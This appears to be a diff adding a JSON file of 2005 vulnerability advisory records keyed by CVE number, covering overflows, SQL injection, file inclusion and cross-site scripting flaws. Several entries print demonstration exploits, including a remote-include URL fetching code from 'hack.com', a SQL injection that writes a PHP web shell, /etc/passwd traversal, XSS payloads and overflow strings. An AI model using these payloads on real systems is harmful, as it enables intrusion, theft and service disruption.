+        "body": "A vulnerability was reported in iTunes. A remote user can cause arbitrary code to be executed on the target system.A remote user can create a specially crafted '.mov' file that, when played by the target user, will trigger a heap overflow and cause the application to crash or to execute arbitrary code. The code will run with the privileges of the target user.A demonstration exploit file is available at:http://www.security-protocols.com/poc/sp-x21-2.movThe vendor has been notified.Tom Ferris discovered this vulnerability.The original advisory is available at:http://security-protocols.com/advisory/sp-x21-advisory.txt",
+        "extra": "A remote user can cause arbitrary code to be executed on the target system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015397",
+        "title": "Apple QuickTime Buffer Overflow in Playing '.mov' Files Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in QuickTime. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted '.mov' file that, when played by the target user, will trigger a heap overflow and cause the application to crash or to execute arbitrary code. The code will run with the privileges of the target user.Some demonstration exploit files are available at:http://www.security-protocols.com/poc/sp-x21-1.movhttp://www.security-protocols.com/poc/sp-x21-2.movThe vendor has been notified.Tom Ferris discovered this vulnerability.The original advisory is available at:http://security-protocols.com/advisory/sp-x21-advisory.txt",
+        "extra": "A remote user can cause arbitrary code to be executed on the target system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4093": [
+      {
+        "url": "http://securitytracker.com/id?1015326",
+        "title": "Check Point VPN-1 SecureClient Lets Local Users Bypass Security Policy",
+        "body": "A vulnerability was reported in Check Point VPN-1 SecureClient. A local user can disable the security policy.A local user can copy the remotely supplied policy file (local.scv) to a file with a different name. Then, the user can edit the new file and create a batch file that, in a loop, continuously copies the new file to the old file name. When the SecureClient is started, the original remotely supplied policy will not be enforced.Viktor Steinmann reported this vulnerability.",
+        "extra": "A local user can disable the security policy.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4199": [
+      {
+        "url": "http://securitytracker.com/id?1015407",
+        "title": "MyBB Input Validation Errors in Multiple Scripts Let Remote Users Inject SQL Commands",
+        "body": "Several vulnerabilities were reported in MyBB. A remote user can inject SQL commands.Several scripts do properly validate user-supplied input. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database. Some of the scripts require the remote user to have an account on the target application.The 'month', 'day', and 'year' parameters of the 'addevent' action in 'calendar.php' are affected.The 'threadmode' and 'showcodebuttons' parameters of the 'options' action in 'usercp.php' are affected.The 'list' parameter of the 'editlists' action of 'usercp.php' is affected.The 'rating' parameter of the 'rate' action of 'member.php' is affected.The 'rating' parameter of the 'showthread.php' script is affected.The vendor was notified on November 11, 2005.Tobias Klein reported these vulnerabilities.The original advisory is available at:http://www.trapkit.de/advisories/TKADV2005-12-001.txt",
+        "extra": "A remote user can execute SQL commands on the underlying database. This can be exploited to obtain administrative privileges on the target application.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4214": [
+      {
+        "url": "http://securitytracker.com/id?1015345",
+        "title": "phpCOIN Include File Bug in 'coin_includes/db.php' Lets Remote Users Execute Arbitrary Code",
+        "body": "rgod reported several vulnerabilities in phpCOIN. A remote user can execute arbitrary code on the target system. A remote user can inject SQL commands. A remote user can also determine the installation path.The 'coin_includes/db.php' script does not properly validate user-supplied input. If register_globals and allow_url_fopen are enabled, a remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.A demonstration exploit URL is provided:http://[target]/[path]/config.php?_CCFG[_PKG_PATH_DBSE]=http://[location]If allow_url_fopen is disabled, a remote user can include and execute local files.Some demonstration exploit URLs are provided:http://[target]/[path]/config.php?_CCFG[_PKG_PATH_DBSE]=../../../../../../../../etc/passwd%00http://[target]/[path]/config.php?_CCFG[_PKG_PATH_DBSE]=../../../../../../../../script.php%00The software does not properly validate user-supplied input in certain cookie values. If magic_quotes_gpc is disabled, a remote user can supply a specially crafted cookie value to execute SQL commands on the underlying database.Some demonstration exploit code is available at:http://rgod.altervista.org/phpcoin_122_sql_xpl.htmlA remote user can request the following URL to cause the system to disclose the installation path:http://[target]/[path]/config.phpThe original advisory is available at:http://rgod.altervista.org/phpcoin122.html",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.A remote user can execute SQL commands on the underlying database.A remote user can determine the installation path.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4263": [
+      {
+        "url": "http://securitytracker.com/id?1015351",
+        "title": "Envolution Input Validation Holes in News Module Permit SQL Injection and Cross-Site Scripting Attacks",
+        "body": "x1ng reported a vulnerability in Envolution. A remote user can inject SQL commands. A remote user can also conduct cross-site scripting attacks.The News module does not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Envolution software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote user can also supply specially crafted parameter values to execute SQL commands on the underlying database.Some demonstration exploit URLs are provided:http://[target]/[envo]/modules.php?op=modload&name=News&file=index&catid=&topic=18&startrow=[sql] or [xss]http://[target]/[envo]/modules.php?op=modload&name=News&file=index&catid=[sql] or [xss]",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Envolution software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4267": [
+      {
+        "url": "http://securitytracker.com/id?1015391",
+        "title": "Eudora WorldMail Server Buffer Overflow in Processing IMAP Commands Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Eudora WorldMail Server. A remote user can execute arbitrary code on the target system.A remote user can send a specially crafted IMAP command to trigger a buffer overflow and cause the target service to crash or execute arbitrary code.Some demonstration exploit requests are provided:IMAP REQUEST: '02 LIST \"\"' + '}'x 5000IMAP REQUEST: '03 LSUB \"\"' + '}'x 32762IMAP REQUEST: '04 SEARCH TEXT ' + '}'x32762IMAP REQUEST: '05 STATUS INBOX ' + '}'x32764IMAP REQUEST: '02 AUTHENTICATE ' + '}'x32768IMAP REQUEST: '02 FETCH 2:4 ' + '}'x10000IMAP REQUEST: '02 SELECT ' + '}'x10000IMAP REQUEST: '02 COPY 2:4 ' + '}'x32765The vulnerability was reported by Tim Shelton.The vendor was notified on December 1, 2005.iDEFENSE reported the same vulnerability, with the advisory available at:http://www.idefense.com/intelligence/vulnerabilities/display.php?id=359",
+        "extra": "A remote user can execute arbitrary code on the target system with System level privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4320": [
+      {
+        "url": "http://securitytracker.com/id?1015364",
+        "title": "Limbo CMS Input Validation Holes Let Remote Users Include Local Files, Execute SQL Commands, and Execute Arbitrary Code",
+        "body": "rgod reported a vulnerability in Limbo CMS. A remote user can include and execute local PHP files. A remote user can determine the installation path. A remote user can inject SQL commands, which can be exploited to execute arbitrary code on the target system.If register_globals is disabled, a remote user can supply specially crafted parameter values to overwrite the _SERVER[] & _SERVER[REMOTE_ADDR] values. If the system uses MySQL for database storage, a remote user can supply specially crafted parameter values to execute SQL commands on the underlying database. This can be exploited to write PHP code to a local file. Then, the remote user can invoke the file to cause the PHP code to be executed.A demonstration exploit URL is provided:http://[target]/[path]/index.php?_SERVER[]&_SERVER[REMOTE_ADDR]=999'UNION%20SELECT%20null,'<?php%20system($_G','ET[cmd]);?>'%20INTO%20DUMPFILE%20'[full_application_path]shell.php'%20FROM%20lm_simple_stats/*&option=weblinks&Itemid=999/*A remote user can also create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Limbo CMS software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A demonstration exploit URL is provided:http://[target]/[path]/?_SERVER[]=&_SERVER[REMOTE_ADDR]=<script>alert(document.cookie)</script>A remote user can include and execute arbitrary PHP files located on the target system. A demonstration exploit URL is provided:http://[target]/[path_to_limbo]/index2.php?option=frontpage/../../../../../../../../../../../scriptA remote user can directly request the following URLs to cause the system to disclose the installation path:http://[target]/[path_to_limbo]/admin/classes/minixml/classes/doc.inc.phphttp://[target]/[path_to_limbo]/admin/classes/minixml/classes/element.inc.phphttp://[target]/[path_to_limbo]/admin/classes/minixml/classes/node.inc.phpThe original advisory is available at:http://rgod.altervista.org/limbo1042_xpl.html",
+        "extra": "A remote user can include and execute local PHP files.A remote user can determine the installation path.A remote user can execute SQL commands on the underlying database. This can be exploited to execute arbitrary code on the target system.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Limbo CMS software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4348": [
+      {
+        "url": "http://securitytracker.com/id?1015383",
+        "title": "Fetchmail Can Be Crashed By Remote Users By Sending a Headerless Message",
+        "body": "A vulnerability was reported in Fetchmail. A remote server can cause Fetchmail to crash.When Fetchmail is configured for multidrop mode, a remote server can send an e-mail message without headers to cause Fetchmail to crash.The vendor credits Daniel Drake of Gentoo with reporting this vulnerability.",
+        "extra": "A remote server can cause fetchmail to crash when downloading a message.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4360": [
+      {
+        "url": "http://securitytracker.com/alerts/2005/Dec/1015376.html",
+        "title": "Microsoft IIS Lets Remote Users Deny Service or Execute Arbitrary Code With Malformed HTTP GET Requests",
+        "body": "A vulnerability was reported in Microsoft Internet Information Server (IIS). A remote user can cause denial of service conditions or execute arbitrary code on the target system.A remote user can send a specially crafted URL four times to the target IIS service to cause the service to crash. Only folders with Execute Permissions set to 'Scripts & Executables' are affected, such as the '_vti_bin' directory.A demonstration exploit URL is provided:http://[target]/_vti_bin/.dll/*\\~0IIS versions 5.0 and 6.0 are not affected.The vendor was notified on January 28, 2005.The vulnerability was originally reported as having a denial of service impact. However, on July 10, 2007, the vendor indicated that remote code execution is possible.A demonstration exploit information is provided at:http://ingehenriksen.blogspot.com/Inge Henriksen discovered this vulnerability.Microsoft credits Jonathan Afek and Adi Sharabani of Watchfire with reporting the remote code execution impact.",
+        "extra": "A remote user can cause the IIS service to crash or execute arbitrary code.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4444": [
+      {
+        "url": "http://securitytracker.com/id?1015385",
+        "title": "Pegasus Mail Buffer Overflows in Processing POP3 Mail and Displaying Message Headers Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Pegasus Mail. A remote mail server can cause arbitrary code to be executed on the target system.A remote POP3 server can send a specially crafted reply to a connected client to trigger a stack overflow and execute arbitrary code on the target client.A remote user can send a specially crafted e-mail messages. When the target user displays the RFC 2822 message headers, a buffer overflow may occur and arbitrary code may be executed.The vendor was notified on December 13, 2005.",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4459": [
+      {
+        "url": "http://securitytracker.com/id?1015401",
+        "title": "VMware Flaw in NAT Function Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in VMware. A remote user can execute arbitrary code on the target system.If the system is using a NAT networking configuration, a remote user can connect to the target system and trigger a heap overflow to escape out of the virtual machine and execute arbitrary userspace code on the target system.The vulnerability resides in 'vmnat.exe' (on Windows-based systems) and 'vmnet-natd' (on Linux systems).VMWare Workstation, VMWare GSX Server, VMWare Ace, and VMWare Player are affected.VMWare ESX Server is not affected.Tim Shelton of ACS reported this vulnerability.The vendor was notified on December 1, 2005.",
+        "extra": "A remote user can execute arbitrary code on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4560": [
+      {
+        "url": "http://securitytracker.com/id?1015416",
+        "title": "Microsoft Windows Unspecified WMF Rendering Bug Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Microsoft Windows in the graphics rendering engine. A remote user can execute arbitrary code on the target user's system.A remote user can create a specially crafted Windows Metafile (WMF) image that, when loaded by the target user, will cause arbitrary code to be executed on the target user's system. The code will run with the privileges of the target user.The image file does not need to have a '.wmf' file extension, as the graphics rendering engine can detect the specific type of image file even if the file extension has been changed.This vulnerability can be exploited via an HTML page.A demonstration exploit is circulating in the wild.A demonstration exploit for the Metasploit Framework is available at:http://metasploit.com/projects/Framework/exploits.html#ie_xp_pfv_metafilehttp://metasploit.com/tools/framework-2.5-snapshot.tar.gz",
+        "extra": "A remote user can create HTML that, when loaded by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4573": [
+      {
+        "url": "http://securitytracker.com/id?1015380",
+        "title": "Plogger '/admin/plog-admin-functions.php' Include File Bug Lets Remote Users Execute Arbitrary Code",
+        "body": "Security .Net Information reported a vulnerability in Plogger. A remote user can execute arbitrary commands on the target system.The '/admin/plog-admin-functions.php' script does not properly validate user-supplied input in the 'config[basedir]' parameter. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.The script is vulnerable in two include (require_once) statements:require_once($config['basedir'] . \"/plog-functions.php\");require_once($config['basedir'] . \"/lib/exifer1_4/exif.php\");http://[target]/PATH/admin/plog-admin-functions.php?config[basedir]=http://www.hack.com/evil_file.php?cmd=uptimeThe original advisory is available at:http://freeconnects.webcindario.com/index.php?option=com_content&task=view&id=41&Itemid=1",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4583": [
+      {
+        "url": "http://securitytracker.com/id?1015422",
+        "title": "VMware ESX Server Input Validation Flaw in Management Interface Log Viewer Permits Cross-Site Scripting Attacks",
+        "body": "A vulnerability was reported in VMware ESX Server. A remote user can conduct cross-site scripting attacks.The Management Interface's log file viewer does not properly filter HTML code from syslog data before displaying the input. A remote user can send specially crafted data to be logged by the server. Then, when the target user views the log file, arbitrary scripting code will be executed by the target user's browser. The code will originate from the site running the VMware ESX Server Management Interface software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.For example, a remote user can attempt to login to the Management Interface with a specially crafted username value. A demonstration exploit value is provided:</div><script>alert('XSS')</script>The vendor was notified on November 15, 2005.The vendor credits Stephen de Vries of Corsaire Limited with reporting this vulnerability.The original advisory is available at:http://www.corsaire.com/advisories/c051114-002.txt",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the VMware ESX Server Management Interface software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4600": [
+      {
+        "url": "http://securitytracker.com/id?1015424",
+        "title": "TinyMCE Compressor Input Validation Bug Discloses File Contents and Permits Cross-Site Scripting Attacks",
+        "body": "A vulnerability was reported in TinyMCE Compressor. A remote user can view the contents of files on the target system. A remote user can conduct cross-site scripting attacks.The script does not properly validate user-supplied input from URL parameters. A remote user may be able to supply a specially crafted filename as a parameter value to cause the script to display the file contents.A remote user can also create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the TinyMCE software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.The specific impact depends on the application that uses TinyMCE Compressor.The vendor was notified on December 27, 2005.Stefan Esser of the Hardened-PHP Project reported this vulnerability.The original advisory is available at:http://www.hardened-php.net/advisory_262005.111.html",
+        "extra": "A remote user can view the contents of files on the target system.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the TinyMCE software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4838": [
+      {
+        "url": "http://securitytracker.com/id?1012793",
+        "title": "Jakarta Tomcat Manager Input Validation Holes Permit Cross-Site Scripting Attacks",
+        "body": "An input validation vulnerability was reported in Apache Jakarta Tomcat. A remote user can conduct cross-site scripting attacks.Oliver Karow reported that the Tomcat manager script does not properly validate user-supplied input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Tomcat software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.Some demonstration exploit URLs are provided:http://[target]:8080/manager/html/<script>alert(\"Hallo\")</script>http://[target]:8080/manager/html/stop?path=<script>alert(\"Hallo\")</script>http://[target]:8080/manager/html/start?path=<script>alert(\"Hallo\")</script>The original advisory is available at:http://www.oliverkarow.de/research/jakarta556_xss.txt",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Tomcat software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4882": [
+      {
+        "url": "http://securitytracker.com/id?1012856",
+        "title": "TFTPD32 Can Be Crashed By Remote Users Requesting Long Filenames",
+        "body": "A denial of service vulnerability was reported in TFTPD32. A remote user can cause the tftp service to crash.Sowhat reported that a remote user can connect to the tftp service and send a specially crafted filename to cause the target tftp service to crash. It may take several requests to trigger the flaw.A demonstration exploit is provided:tftp -i [target] get AAAAA...[about 508 'A' here]...AAThe vendor has been notified without response.The original advisory is available at:http://secway.org/advisory/ad20050112.txt",
+        "extra": "A remote user can cause the tftp service to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ]
+  }
+}
